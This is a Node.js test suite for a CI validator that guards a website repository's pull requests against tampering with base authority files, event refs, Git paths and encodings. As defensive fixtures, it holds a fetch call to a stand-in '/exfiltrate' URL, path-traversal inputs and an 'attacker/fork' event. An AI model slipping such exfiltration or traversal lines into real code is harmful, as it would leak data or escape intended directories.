import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { access, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";

import {
  CANONICAL_AUTHORITY_PATHS,
  runBaseOnlyGitSimulation,
  runBaseOnlySimulation,
  verifyMaterializedAuthoritySnapshot,
} from "../../scripts/governance/validate-f2-gov-08.mjs";
import * as portableGuard from "../../scripts/governance/validate-f2-gov-08.mjs";

const root = new URL("../../", import.meta.url);
const sourceRepository = decodeURIComponent(root.pathname).replace(/^\/(.:)/, "$1").replace(/\/$/, "");
const canonicalPaths = Object.values(CANONICAL_AUTHORITY_PATHS);
const canonicalBlob = (path) => execFileSync("git", ["cat-file", "blob", `HEAD:${path}`], { cwd: sourceRepository, encoding: null, stdio: ["ignore", "pipe", "pipe"] });
const publishedPaths = JSON.parse(canonicalBlob("deploy/publish-manifest.json").toString("utf8")).files;
const html = (title, width = 44, height = 44) => `<!doctype html><html data-drawer-capable="true" data-focus-capable="true" data-target-width="${width}" data-target-height="${height}" data-focus-target-width="48" data-focus-target-height="48"><title>${title}</title></html>`;

async function write(repository, path, bytes) {
  const target = join(repository, ...path.split("/"));
  await mkdir(dirname(target), { recursive: true });
  await writeFile(target, bytes);
}

function splitNulBuffers(bytes) {
  const fields = [];
  for (let start = 0; start < bytes.length;) {
    const end = bytes.indexOf(0, start);
    assert.notEqual(end, -1, "binary Git fixture is not NUL terminated");
    if (end > start) fields.push(bytes.subarray(start, end));
    start = end + 1;
  }
  return fields;
}

async function publishBinaryRootEntries(fixture, entries, message) {
  const records = splitNulBuffers(execFileSync("git", ["ls-tree", "-z", "HEAD^{tree}"], { cwd: fixture.repository, encoding: null }));
  for (const { pathBytes, content = html("binary path") } of entries) {
    const oid = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: Buffer.from(content), encoding: "utf8" }).trim();
    records.push(Buffer.concat([Buffer.from(`100644 blob ${oid}\t`, "ascii"), pathBytes]));
  }
  records.sort((left, right) => Buffer.compare(left.subarray(left.indexOf(9) + 1), right.subarray(right.indexOf(9) + 1)));
  const treeInput = Buffer.concat(records.flatMap((record) => [record, Buffer.from([0])]));
  const tree = execFileSync("git", ["mktree", "-z"], { cwd: fixture.repository, input: treeInput, encoding: "utf8" }).trim();
  const commit = execFileSync("git", ["commit-tree", tree, "-p", fixture.headSha], { cwd: fixture.repository, input: `${message}\n`, encoding: "utf8" }).trim();
  fixture.git("update-ref", "refs/heads/candidate", commit);
  fixture.git("update-ref", "refs/remotes/origin/candidate", commit);
  fixture.headSha = commit;
  fixture.event.pull_request.head.sha = commit;
  await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
}

async function createRepository() {
  const repository = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-f1-"));
  const git = (...args) => execFileSync("git", args, { cwd: repository, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
  git("init", "--quiet", "--initial-branch=main");
  git("config", "user.email", "f2-gov-08@example.invalid");
  git("config", "user.name", "F2-GOV-08 fixture");
  for (const path of canonicalPaths) await write(repository, path, canonicalBlob(path));
  await write(repository, "index.html", html("base"));
  await write(repository, "politica-privacidade.html", html("privacy"));
  await write(repository, "src/css/branct.css", ".menu{display:block}\n");
  await write(repository, "src/js/branct.js", "document.documentElement.dataset.ready='true';\n");
  git("add", ".");
  git("commit", "--quiet", "-m", "trusted base authority");
  const baseSha = git("rev-parse", "HEAD");
  git("update-ref", "refs/remotes/origin/main", baseSha);
  git("checkout", "--quiet", "-b", "candidate");
  await write(repository, "index.html", html("candidate"));
  git("add", "index.html");
  git("commit", "--quiet", "-m", "candidate live change");
  const headSha = git("rev-parse", "HEAD");
  git("update-ref", "refs/remotes/origin/candidate", headSha);
  const eventPath = join(repository, "event.json");
  const event = {
    pull_request: {
      base: { ref: "main", sha: baseSha },
      head: { ref: "candidate", sha: headSha },
    },
    repository: { full_name: "branctstudio-rgb/sitebranct" },
  };
  await writeFile(eventPath, JSON.stringify(event));
  return { repository, git, baseSha, headSha, eventPath, event };
}

const run = (fixture, extra = {}) => runBaseOnlyGitSimulation({ repository: fixture.repository, eventPath: fixture.eventPath, ...extra });

const syntheticTreeEntries = (paths) => paths.map((path, index) => ({
  mode: "100644",
  type: "blob",
  oid: (index + 1).toString(16).padStart(40, "0"),
  path,
  pathBytes: Buffer.from(path, "ascii"),
}));

function permutations(values) {
  if (values.length < 2) return [values];
  return values.flatMap((value, index) => permutations(values.filter((_, candidate) => candidate !== index)).map((rest) => [value, ...rest]));
}

function currentGitTreeEntries() {
  return splitNulBuffers(execFileSync("git", ["ls-tree", "-rz", "--full-tree", "HEAD"], { cwd: sourceRepository, encoding: null })).map((record) => {
    const tab = record.indexOf(9);
    const [mode, type, oid] = record.subarray(0, tab).toString("ascii").split(" ");
    const pathBytes = record.subarray(tab + 1);
    return { mode, type, oid, path: pathBytes.toString("ascii"), pathBytes };
  });
}

async function publishFixtureHead(fixture, message) {
  fixture.git("commit", "--quiet", "-m", message);
  fixture.headSha = fixture.git("rev-parse", "HEAD");
  fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
  fixture.event.pull_request.head.sha = fixture.headSha;
  await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
}

test("F2-GOV-08 legitimate path executes the exact base consumer and produces complete evidence", async () => {
  const fixture = await createRepository();
  try {
    const result = run(fixture);
    assert.equal(result.decision, "PASS");
    assert.equal(result.authority.baseSha, fixture.baseSha);
    assert.equal(result.authority.headSha, fixture.headSha);
    assert.equal(result.authority.contract.path, CANONICAL_AUTHORITY_PATHS.contract);
    assert.equal(result.authority.manifest.path, CANONICAL_AUTHORITY_PATHS.manifest);
    assert.equal(result.authority.origins.consumer.path, CANONICAL_AUTHORITY_PATHS.consumer);
    assert.equal(result.evidence.length, 4);
    assert.ok(result.evidence.every(({ semanticResult, digest }) => semanticResult === "PASS" && /^[0-9a-f]{64}$/.test(digest)));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 removes every caller injection API for authority and result inputs", async (t) => {
  const fixture = await createRepository();
  try {
    for (const [name, value] of [
      ["contract", {}], ["manifest", {}], ["pins", []], ["matrix", []], ["expectations", []],
      ["consumer", "alternate"], ["baseSha", fixture.baseSha], ["headSha", fixture.headSha],
      ["readRaw", () => ({})], ["envelope", {}], ["result", "PASS"],
    ]) await t.test(name, () => assert.throws(() => run(fixture, { [name]: value }), /trusted harness input schema is not exact/i));
    assert.throws(() => runBaseOnlySimulation({}), /caller-controlled authority API was removed/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects joint contract and manifest replacement in the producer head", async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, CANONICAL_AUTHORITY_PATHS.contract, "{}\n");
    await write(fixture.repository, CANONICAL_AUTHORITY_PATHS.manifest, "{}\n");
    fixture.git("add", CANONICAL_AUTHORITY_PATHS.contract, CANONICAL_AUTHORITY_PATHS.manifest);
    fixture.git("commit", "--quiet", "-m", "joint authority replacement");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /head changed a non-live or protected authority path|canonical .* at head changed/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, path, content] of [
  ["consumer", CANONICAL_AUTHORITY_PATHS.consumer, "process.exit(0);\n"],
  ["matrix", CANONICAL_AUTHORITY_PATHS.matrix, "[]\n"],
  ["expectations", CANONICAL_AUTHORITY_PATHS.expectations, "[]\n"],
  ["static server", CANONICAL_AUTHORITY_PATHS.staticServer, "export default {};\n"],
]) test(`F2-GOV-08 rejects producer alteration of ${label}`, async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, path, content);
    fixture.git("add", path);
    fixture.git("commit", "--quiet", "-m", `alter ${label}`);
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /head changed a non-live or protected authority path|canonical .* at head changed/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects alternate imports in the consumer authority", async () => {
  const source = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const localImports = [...source.matchAll(/from\s+["'](\.\/[^"']+)["']/g)].map((match) => match[1]);
  assert.deepEqual(localImports, ["./f2-gov-08-static-server.mjs"]);
  assert.doesNotMatch(source, /import\s*\(/);
  assert.match(source, /const require = createRequire\(join\(modules, "\.\.", "package\.json"\)\);\s*const playwright = require\("playwright"\);/);
  assert.equal((source.match(/\brequire\(/g) ?? []).length, 1, "trusted consumer may require only the pinned Playwright package");
});

test("F2-GOV-08 rejects event base, head, repository and ref transplantation", async (t) => {
  const fixture = await createRepository();
  try {
    const cases = [
      ["base", (event) => { event.pull_request.base.sha = "1".repeat(40); }, /cannot resolve|base/i],
      ["head", (event) => { event.pull_request.head.sha = "2".repeat(40); }, /cannot resolve|head/i],
      ["repository", (event) => { event.repository.full_name = "attacker/fork"; }, /repository is divergent/i],
      ["base ref", (event) => { event.pull_request.base.ref = "release"; }, /base ref is divergent/i],
      ["head ref", (event) => { event.pull_request.head.ref = "other"; }, /trusted head ref|cannot resolve.*origin\/other/i],
    ];
    for (const [label, mutate, expected] of cases) await t.test(label, async () => {
      const original = structuredClone(fixture.event);
      mutate(original);
      await writeFile(fixture.eventPath, JSON.stringify(original));
      assert.throws(() => run(fixture), expected);
    });
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects moved remote refs even when event SHAs remain unchanged", async (t) => {
  const fixture = await createRepository();
  try {
    fixture.git("commit", "--allow-empty", "--quiet", "-m", "untrusted ref movement");
    const moved = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", moved);
    await t.test("head ref", () => assert.throws(() => run(fixture), /trusted head ref is divergent/i));
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.git("update-ref", "refs/remotes/origin/main", moved);
    await t.test("base ref", () => assert.throws(() => run(fixture), /trusted base ref is divergent/i));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a non-ancestral operational base", async () => {
  const fixture = await createRepository();
  try {
    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: "unrelated\n", encoding: "utf8" }).trim();
    const tree = execFileSync("git", ["mktree"], { cwd: fixture.repository, input: `100644 blob ${blob}\tunrelated.txt\n`, encoding: "utf8" }).trim();
    const unrelated = execFileSync("git", ["commit-tree", tree], { cwd: fixture.repository, input: "unrelated head\n", encoding: "utf8" }).trim();
    fixture.git("update-ref", "refs/remotes/origin/candidate", unrelated);
    fixture.event.pull_request.head.sha = unrelated;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /operational base is not an ancestor/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, mode, bytes, expected] of [
  ["executable mode", "100755", canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer), /canonical consumer has unexpected Git mode/i],
  ["symlink mode", "120000", Buffer.from("alternate-consumer.mjs\n"), /canonical consumer has unexpected Git mode/i],
  ["blob digest", "100644", Buffer.from("process.exit(0);\n"), /canonical consumer (size|digest) is divergent/i],
]) test(`F2-GOV-08 rejects authority ${label} at the trusted base`, async () => {
  const fixture = await createRepository();
  try {
    const blob = execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: bytes, encoding: null }).toString().trim();
    fixture.git("checkout", "--quiet", "main");
    fixture.git("update-index", "--add", "--cacheinfo", `${mode},${blob},${CANONICAL_AUTHORITY_PATHS.consumer}`);
    fixture.git("commit", "--quiet", "-m", `authority ${label}`);
    fixture.baseSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/main", fixture.baseSha);
    await write(fixture.repository, "index.html", html("candidate over altered base"));
    fixture.git("add", "index.html");
    fixture.git("commit", "--quiet", "-m", "candidate over altered base");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.base.sha = fixture.baseSha;
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), expected);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, path, content, expected] of [
  ["unknown path", "unknown/private.txt", "private\n", /non-live|protected authority/i],
  ["producer command", "scripts/producer.mjs", "process.exit(0);\n", /non-live|protected authority/i],
  ["producer envelope", "result.json", "{\"decision\":\"PASS\"}\n", /non-live|protected authority/i],
]) test(`F2-GOV-08 rejects ${label}`, async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, path, content);
    fixture.git("add", path);
    fixture.git("commit", "--quiet", "-m", label);
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), expected);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects OBSERVATION_PAYLOAD_SWAP measured from a live candidate", async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, "index.html", html("candidate", 43, 44));
    fixture.git("add", "index.html");
    fixture.git("commit", "--quiet", "-m", "swap measured payload");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /OBSERVATION_PAYLOAD_SWAP/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 actual materialization guard rejects TOCTOU before execution", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-toctou-"));
  try {
    const target = join(directory, "consumer.mjs");
    const bytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer);
    await writeFile(target, bytes);
    const manifest = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.manifest).toString("utf8"));
    const pin = manifest.files.find(({ role }) => role === "consumer");
    const files = new Map([["consumer", { bytes, pin }]]);
    const materialized = new Map([["consumer", target]]);
    assert.doesNotThrow(() => verifyMaterializedAuthoritySnapshot(files, materialized));
    await writeFile(target, "process.exit(0);\n");
    assert.throws(() => verifyMaterializedAuthoritySnapshot(files, materialized), /TOCTOU|size changed after validation/i);
  } finally { await rm(directory, { recursive: true, force: true }); }
});

for (const [label, mutate] of [
  ["full-similarity rename to an allowed root HTML path", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert.html");
  }],
  ["partial-similarity rename to an allowed root HTML path", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert.html");
    await write(fixture.repository, "inert.html", `${canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8")}\n// partial rename\n`);
    fixture.git("add", "inert.html");
  }],
  ["copy followed by removal", async (fixture) => {
    await write(fixture.repository, "inert.html", canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer));
    fixture.git("rm", "--quiet", CANONICAL_AUTHORITY_PATHS.consumer);
    fixture.git("add", "inert.html");
  }],
  ["case-only path replacement", async (fixture) => {
    const changedCase = "scripts/governance/F2-GOV-08-consumer.mjs";
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "temporary-authority-name");
    fixture.git("mv", "temporary-authority-name", changedCase);
  }],
  ["rename to a path containing spaces", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert authority.html");
  }],
  ["rename to a path containing unusual Unicode", async (fixture) => {
    fixture.git("mv", CANONICAL_AUTHORITY_PATHS.consumer, "inert-autoridade-ç.html");
  }],
]) test(`F2-GOV-08 rejects protected consumer ${label}`, async () => {
  const fixture = await createRepository();
  try {
    await mutate(fixture);
    await publishFixtureHead(fixture, `protected consumer ${label}`);
    assert.throws(() => run(fixture), /protected authority|canonical consumer.*head|structural Git diff|portable character|not ASCII/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects an authority blob transplanted to a Git path containing a tab", async () => {
  const fixture = await createRepository();
  try {
    const oid = fixture.git("rev-parse", `HEAD:${CANONICAL_AUTHORITY_PATHS.consumer}`);
    const existing = execFileSync("git", ["ls-tree", "-z", "HEAD^{tree}"], { cwd: fixture.repository, encoding: null }).toString("utf8").split("\0").filter(Boolean);
    existing.push(`100644 blob ${oid}\tinert\tauthority.html`);
    existing.sort((left, right) => left.slice(left.indexOf("\t") + 1).localeCompare(right.slice(right.indexOf("\t") + 1), "en"));
    const tree = execFileSync("git", ["mktree", "-z"], { cwd: fixture.repository, input: Buffer.from(`${existing.join("\0")}\0`), encoding: "utf8" }).trim();
    const commit = execFileSync("git", ["commit-tree", tree, "-p", fixture.headSha], { cwd: fixture.repository, input: "tab path authority transplant\n", encoding: "utf8" }).trim();
    fixture.git("update-ref", "refs/heads/candidate", commit);
    fixture.git("update-ref", "refs/remotes/origin/candidate", commit);
    fixture.headSha = commit;
    fixture.event.pull_request.head.sha = commit;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), /protected authority blob was transplanted|protected authority|forbidden portable character/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, invalidBytes] of [
  ["isolated invalid byte", [0xff]],
  ["truncated sequence", [0xe2, 0x82]],
  ["continuation byte without a starter", [0x80]],
  ["overlong encoding", [0xc0, 0xaf]],
  ["encoded surrogate", [0xed, 0xa0, 0x80]],
]) test(`F2-GOV-08 rejects ${label} in a Git path before policy classification`, async () => {
  const fixture = await createRepository();
  try {
    const pathBytes = Buffer.concat([Buffer.from("inert-", "ascii"), Buffer.from(invalidBytes), Buffer.from(".html", "ascii")]);
    await publishBinaryRootEntries(fixture, [{ pathBytes }], `invalid UTF-8: ${label}`);
    assert.throws(() => run(fixture), /Git path is not canonical UTF-8|invalid UTF-8/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects distinct invalid byte paths instead of collapsing both to replacement characters", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [
      { pathBytes: Buffer.concat([Buffer.from("inert-", "ascii"), Buffer.from([0xff]), Buffer.from(".html", "ascii")]) },
      { pathBytes: Buffer.concat([Buffer.from("inert-", "ascii"), Buffer.from([0xfe]), Buffer.from(".html", "ascii")]) },
    ], "invalid UTF-8 collision");
    assert.throws(() => run(fixture), /Git path is not canonical UTF-8|invalid UTF-8/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects Unicode because the current portable path inventory is ASCII-only", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("página.html", "utf8") }], "valid NFC UTF-8 path");
    assert.throws(() => run(fixture), /Git path is not ASCII|ASCII-only/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a canonically equivalent decomposed Unicode live path", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("pa\u0301gina.html", "utf8") }], "decomposed Unicode path");
    assert.throws(() => run(fixture), /Git path is not ASCII|ASCII-only/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a byte-different decomposed representation of a protected-looking path", async () => {
  const fixture = await createRepository();
  try {
    const pathBytes = Buffer.from("scripts-governance-f2-gov-08-consume\u0072\u0301.mjs.html", "utf8");
    await publishBinaryRootEntries(fixture, [{ pathBytes }], "protected path normalization ambiguity");
    assert.throws(() => run(fixture), /Git path is not ASCII|ASCII-only/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 portable grammar accepts every one of the 56 current published paths", () => {
  assert.equal(publishedPaths.length, 56);
  assert.deepEqual(
    publishedPaths.map((path) => portableGuard.validatePortableGitPathBytes(Buffer.from(path, "ascii"))),
    publishedPaths,
  );
});

test("F2-GOV-08 portable trie accepts all 806 current regular Git paths and all 56 manifest paths", () => {
  const current = currentGitTreeEntries();
  assert.equal(current.length, 806);
  assert.ok(current.every(({ mode, type }) => mode === "100644" && type === "blob"));
  assert.equal(portableGuard.validatePortableGitTreeEntries(current).entries.length, 806);
  assert.equal(portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(publishedPaths)).entries.length, 56);
});

for (const [label, paths] of [
  ["file versus case-folded child", ["src/js/Foo", "src/js/foo/bar.js"]],
  ["case-divergent directory merge", ["src/JS/a.js", "src/js/b.js"]],
  ["file as exact parent prefix", ["assets", "assets/logo.png"]],
  ["multi-level case divergence", ["SRC/images/icons/a.png", "src/Images/other.png"]],
  ["transitive three-way conflict", ["assets/logo.png", "ASSETS", "Assets/icons/x.svg"]],
]) test(`F2-GOV-08 portable trie rejects ${label} in every input order`, () => {
  for (const ordered of permutations(paths)) {
    assert.throws(
      () => portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(ordered)),
      /portable tree collision|file.*directory|capitalization|prefix/i,
      `order must fail closed: ${ordered.join(" -> ")}`,
    );
  }
});

test("F2-GOV-08 portable trie rejects a child inserted before its file parent", () => {
  assert.throws(
    () => portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(["assets/logo.png", "assets"])),
    /portable tree collision|file.*directory|prefix/i,
  );
});

test("F2-GOV-08 portable trie records only regular Git files as materializable leaves", () => {
  assert.equal(typeof portableGuard.validatePortableGitTreeEntries, "function", "portable trie validator is absent");
  for (const entry of [
    { ...syntheticTreeEntries(["src/js/link.js"])[0], mode: "120000", type: "blob" },
    { ...syntheticTreeEntries(["src/js/submodule.js"])[0], mode: "160000", type: "commit" },
    { ...syntheticTreeEntries(["src/js/executable.js"])[0], mode: "100755", type: "blob" },
  ]) assert.throws(() => portableGuard.validatePortableGitTreeEntries([entry]), /regular Git file|unexpected Git mode|unexpected Git type/i);
});

for (const [label, path, expected] of [
  ["reserved CON with extension", "CON.html", /reserved Windows device/i],
  ["reserved con without extension", "con", /reserved Windows device/i],
  ["reserved NUL with extension", "NUL.txt", /reserved Windows device/i],
  ["reserved COM1 with extension", "COM1.js", /reserved Windows device/i],
  ["reserved LPT9 with extension", "LPT9.css", /reserved Windows device/i],
  ["alternate data stream", "inert:probe.html", /forbidden portable character|alternate data stream/i],
  ["alternate data stream marker", "index.html:$DATA", /forbidden portable character|alternate data stream/i],
  ["trailing dot", "inert.html.", /trailing dot or space/i],
  ["trailing space", "inert.html ", /trailing dot or space/i],
  ["backslash", "src\\js\\branct.js", /backslash|forbidden portable character/i],
  ["drive letter", "C:/index.html", /absolute|drive/i],
  ["UNC path", "\\\\server\\share.html", /UNC|backslash|absolute/i],
  ["parent traversal", "../escape.html", /traversal/i],
  ["current traversal", "./index.html", /traversal/i],
  ["empty segment", "src//index.html", /empty segment|traversal/i],
  ["control character", "inert\u0001.html", /control|forbidden portable character/i],
  ["forbidden question mark", "inert?.html", /forbidden portable character/i],
  ["Unicode normalization ambiguity", "pa\u0301gina.html", /Git path is not ASCII|ASCII-only/i],
]) test(`F2-GOV-08 portable grammar rejects ${label} deterministically`, () => {
  assert.throws(() => portableGuard.validatePortableGitPathBytes(Buffer.from(path, "utf8")), expected);
});

test("F2-GOV-08 rejects a case-insensitive collision before materialization", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("INDEX.html", "ascii") }], "case collision");
    assert.throws(() => run(fixture), /portable path collision.*index\.html.*INDEX\.html|portable path collision.*INDEX\.html.*index\.html/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 requires the canonical index.html bytes and capitalization", async () => {
  const fixture = await createRepository();
  try {
    fixture.git("mv", "index.html", "temporary-index-name");
    fixture.git("mv", "temporary-index-name", "INDEX.html");
    await publishFixtureHead(fixture, "replace canonical index capitalization");
    assert.throws(() => run(fixture), /canonical live path index\.html is absent or has different bytes\/capitalization/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a reserved Windows name before materialization", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("CON.html", "ascii") }], "reserved path");
    assert.throws(() => run(fixture), /reserved Windows device/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 materializer rejects an escaping destination before writing", async () => {
  const root = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-materialize-"));
  const escaped = join(dirname(root), "escape.html");
  try {
    assert.throws(() => portableGuard.materializePortableBlob(root, "../escape.html", Buffer.from("blocked")), /traversal|escapes trusted root/i);
    await assert.rejects(access(escaped));
  } finally { await rm(root, { recursive: true, force: true }); }
});

for (const [role, path] of [
  ["contract", CANONICAL_AUTHORITY_PATHS.contract],
  ["pins", CANONICAL_AUTHORITY_PATHS.manifest],
  ["matrix", CANONICAL_AUTHORITY_PATHS.matrix],
  ["expectations", CANONICAL_AUTHORITY_PATHS.expectations],
]) test(`F2-GOV-08 rejects rename of canonical ${role} authority`, async () => {
  const fixture = await createRepository();
  try {
    fixture.git("mv", path, `${role}-authority.html`);
    await publishFixtureHead(fixture, `rename canonical ${role}`);
    const canonicalLabel = role === "pins" ? "manifest" : role;
    assert.throws(() => run(fixture), new RegExp(`protected authority|canonical ${canonicalLabel}.*head|structural Git diff`, "i"));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, mode, oidFactory] of [
  ["symlink", "120000", (fixture) => execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: "inert.html", encoding: "utf8" }).trim()],
  ["gitlink", "160000", (fixture) => fixture.baseSha],
]) test(`F2-GOV-08 rejects consumer replaced by ${label} in the head tree`, async () => {
  const fixture = await createRepository();
  try {
    const oid = oidFactory(fixture);
    fixture.git("update-index", "--add", "--cacheinfo", `${mode},${oid},${CANONICAL_AUTHORITY_PATHS.consumer}`);
    await publishFixtureHead(fixture, `replace consumer with ${label}`);
    assert.throws(() => run(fixture), /canonical consumer.*head|protected authority|unexpected Git (mode|type)/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, path, content, expected] of [
  ["external network attempt", "src/js/branct.js", "fetch('https://example.invalid/exfiltrate');\n", /external network intent/i],
  ["KEYED_PRODUCER_TRANSPLANT", "index.html", `${html("candidate").replace("<html ", "<html data-authority-key=\"producer\" ")}`, /KEYED_PRODUCER_TRANSPLANT/i],
]) test(`F2-GOV-08 rejects ${label} from candidate content`, async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, path, content);
    fixture.git("add", path);
    fixture.git("commit", "--quiet", "-m", label);
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), expected);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-09 promotes the base-only authority to operational enforcement", () => {
  const contract = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.contract).toString("utf8"));
  const workflow = canonicalBlob(".github/workflows/universal-pr-gate.yml").toString("utf8");
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.equal(contract.status, "OPERATIONAL_CANDIDATE");
  assert.equal(contract.limitations.workflowEnforcement, "CANDIDATE_PENDING_PROTECTED_MERGE");
  assert.equal(contract.limitations.operationalIsolation, "VERIFIED_IN_CI");
  assert.equal(contract.limitations.browserNetworkIsolation, "VERIFIED_IN_CI");
  assert.match(workflow, /Run base-only F2-GOV-08 enforcement/);
  assert.match(workflow, /git cat-file blob "\$\{BASE_SHA\}:scripts\/governance\/validate-f2-gov-08\.mjs"/);
  assert.match(consumer, /chromium/);
  assert.match(consumer, /firefox/);
  assert.match(consumer, /webkit/);
  assert.match(consumer, /context\.route\(/);
  assert.match(canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8"), /127\.0\.0\.1/);
});

test("F2-GOV-09 canonical matrix fixes 84 observations, 41 identities and 184 actions per engine", () => {
  const matrix = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.matrix).toString("utf8"));
  assert.deepEqual(matrix.engines, ["chromium", "firefox", "webkit"]);
  assert.equal(matrix.observationCountPerEngine, 84);
  assert.equal(matrix.menuEvidenceCountPerEngine, 41);
  assert.equal(matrix.actionCountPerEngine, 184);
  assert.deepEqual(matrix.viewports["1024x768"], [1024, 768]);
});
